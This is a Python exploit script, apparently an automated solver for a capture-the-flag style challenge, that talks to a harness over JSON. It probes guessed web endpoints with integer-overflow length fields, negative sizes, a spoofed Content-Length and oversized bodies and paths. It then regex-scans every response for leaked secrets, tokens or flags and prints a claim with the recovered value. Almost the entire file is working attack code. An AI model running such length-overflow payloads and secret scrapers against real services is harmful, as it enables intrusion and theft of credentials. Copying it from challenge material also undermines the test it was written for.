import json, sys, re, base64, time

STD = sys.stdin
OUT = sys.stdout

def log(*a):
    try:
        sys.stderr.write(' '.join(str(x) for x in a) + '\n')
        sys.stderr.flush()
    except Exception:
        pass

def send(obj):
    try:
        OUT.write(json.dumps(obj) + '\n')
        OUT.flush()
    except Exception as e:
        log('send fail', e)
        return None
    while True:
        line = STD.readline()
        if not line:
            return None
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
        except Exception:
            continue
        if isinstance(d, dict) and ('status' in d or 'body_b64' in d or 'pad_ok' in d):
            return d

def body_bytes(rep):
    if not rep:
        return b''
    b = rep.get('body_b64')
    if isinstance(b, str):
        try:
            return base64.b64decode(b, validate=False)
        except Exception:
            return b.encode('utf-8', 'replace')
    if isinstance(b, bytes):
        return b
    t = rep.get('body')
    if isinstance(t, str):
        return t.encode('utf-8', 'replace')
    return b''

FOUND = []
SEEN_BODIES = []

def scan(rep, body):
    txt = None
    try:
        txt = body.decode('utf-8', 'replace')
    except Exception:
        txt = ''
    SEEN_BODIES.append(txt)
    cands = []
    # explicit labels
    for m in re.finditer(r'(?i)secret\W{0,12}?([0-9a-fA-F]{8,512})', txt):
        cands.append(('hex', m.group(1)))
    for m in re.finditer(r'(?i)secret\W{0,12}?([A-Za-z0-9+/=_-]{8,128})', txt):
        cands.append(('ascii', m.group(1)))
    for m in re.finditer(r'(?i)(token|flag|key)\W{0,12}?([0-9a-fA-F]{16,512})', txt):
        cands.append(('hex', m.group(2)))
    for m in re.finditer(r'(?i)(token|flag)\W{0,12}?([A-Za-z0-9+/=_-]{12,128})', txt):
        cands.append(('ascii', m.group(2)))
    for m in re.finditer(r'\b([0-9a-fA-F]{32,256})\b', txt):
        cands.append(('hex', m.group(1)))
    for m in re.finditer(r'([0-9a-fA-F]{48,})', txt):
        cands.append(('hex', m.group(1)))
    if 'secret' in txt.lower():
        for m in re.finditer(r'"secret"\s*:\s*"([^"]{4,200})"', txt):
            cands.append(('ascii', m.group(1)))
    hexre = re.compile(rb'[0-9a-fA-F]{24,}')
    for m in hexre.finditer(body):
        cands.append(('hex', m.group(0).decode()))
    for kind, v in cands:
        if kind == 'ascii':
            v2 = v.encode().hex()
        else:
            v2 = v.lower()
            if len(v2) % 2 == 1:
                continue
            if not re.fullmatch(r'[0-9a-f]+', v2):
                continue
        if len(v2) < 16:
            continue
        if v2 not in FOUND:
            FOUND.append(v2)
    return len(FOUND) > 0

def payloads():
    P = []
    A = b'A' * 64
    for L in (0xFFFFFFFF, 0x7FFFFFFF, 0xFFFFFFFE, 0x10000000, 0x0FFFFFFF, 0xFFFF0000, 0x00010000, 0x0000FFFF):
        P.append((L.to_bytes(4, 'big') + A, 'oct'))
        P.append((L.to_bytes(4, 'little') + A, 'oct'))
    P.append(((0xFFFFFFFFFFFFFFFF).to_bytes(8, 'big') + A, 'oct'))
    P.append(((0x7FFFFFFFFFFFFFFF).to_bytes(8, 'big') + A, 'oct'))
    P.append((b'\xff' * 8 + A, 'oct'))
    P.append((b'\xff' * 4, 'oct'))
    P.append((b'\x00' * 4 + A, 'oct'))
    P.append((A, 'oct'))
    P.append((b'A' * 4096, 'oct'))
    P.append((b'\x00' * 64, 'oct'))
    P.append((b'LEN=4294967295\n' + A, 'txt'))
    P.append((b'4294967295\n' + A, 'txt'))
    P.append((b'4294967295:' + A, 'txt'))
    P.append((b'R|4294967295|' + A, 'txt'))
    P.append((b'REC 4294967295 ' + A, 'txt'))
    P.append((json.dumps({'len': 4294967295, 'data': 'A' * 64}).encode(), 'json'))
    P.append((json.dumps({'length': 4294967295, 'data': 'A' * 64}).encode(), 'json'))
    P.append((json.dumps({'size': -1, 'data': 'A' * 64}).encode(), 'json'))
    P.append((json.dumps({'type': 'REC', 'length': 4294967295, 'payload': 'A' * 64}).encode(), 'json'))
    P.append((json.dumps({'length': '0xFFFFFFFF', 'data': 'A' * 64}).encode(), 'json'))
    return P

CT = {'oct': 'application/octet-stream', 'txt': 'text/plain', 'json': 'application/json'}

PATHS = ['/', '/parse', '/record', '/records', '/upload', '/api/parse', '/api/record', '/data',
         '/read', '/ingest', '/submit', '/frame', '/packet', '/post', '/write', '/stream',
         '/api/records', '/v1/parse', '/rpc', '/process', '/handle', '/decode', '/index.html']

Q = {'n': 0, 'max': 500}
DEADLINE = time.monotonic() + 150

def hit():
    return bool(FOUND)

def query(method, path, body=None, headers=None, label=''):
    if Q['n'] >= Q['max'] or time.monotonic() > DEADLINE or hit():
        return None
    obj = {'http': {'method': method, 'path': path}}
    if headers:
        obj['http']['headers'] = headers
    if body is not None:
        try:
            obj['http']['body_hex'] = body.hex()
        except Exception:
            obj['http']['body'] = str(body)
    Q['n'] += 1
    rep = send(obj)
    b = body_bytes(rep)
    log('Q%d %s %s %s -> %s len=%d' % (Q['n'], method, path, label, (rep or {}).get('status'), len(b)))
    scan(rep, b)
    return b

# Phase 1: GET probing, collect hints
paths = list(PATHS)
for p in PATHS:
    t = query('GET', p, label='probe')
    if t:
        txt = t.decode('utf-8', 'replace')
        for m in re.finditer(r'/[A-Za-z0-9_\-]{2,30}', txt):
            s = m.group(0)
            if re.search(r'(?i)pars|rec|up|read|data|post|ing|frame|msg|pack|buf|recv|load|feed|consume', s):
                if s not in paths:
                    paths.append(s)
    if hit():
        break

log('paths:', paths)

# Phase 2: POST payloads
for p in paths:
    if hit():
        break
    for body, kind in payloads():
        if hit():
            break
        query('POST', p, body, {'Content-Type': CT[kind]}, label='post-' + kind)

# Phase 3: GET with query params
if not hit():
    qps = ['?len=4294967295', '?length=4294967295', '?size=4294967295', '?n=4294967295',
           '?count=4294967295', '?len=99999999999999', '?length=-1', '?size=-1', '?len=0xFFFFFFFF']
    for p in ['/', '/parse', '/record', '/upload', '/api/parse', '/records', '/read', '/data']:
        for q in qps:
            if hit():
                break
            query('GET', p + q, label='qp')

# Phase 4: custom headers / long path
if not hit():
    for p in ['/', '/parse', '/record']:
        for hd in ({'X-Content-Length': '4294967295'}, {'Content-Length': '4294967295'},
                   {'X-Record-Length': '4294967295'}, {'Content-Type': 'application/octet-stream'}):
            if hit():
                break
            query('POST', p, b'A' * 128, hd, label='hdr')
    for p in ['/', '/parse', '/record']:
        if hit():
            break
        query('GET', p + '/' + 'A' * 3000, label='longpath')

secs = int((time.monotonic() - (DEADLINE - 150)) * 1e9)
log('found:', FOUND)
secret = FOUND[0] if FOUND else '00' * 16
OUT.write('OPSPAN_NS:%d\n' % secs)
OUT.write('CLAIM:{"secret_hex": "%s"}\n' % secret)
OUT.flush()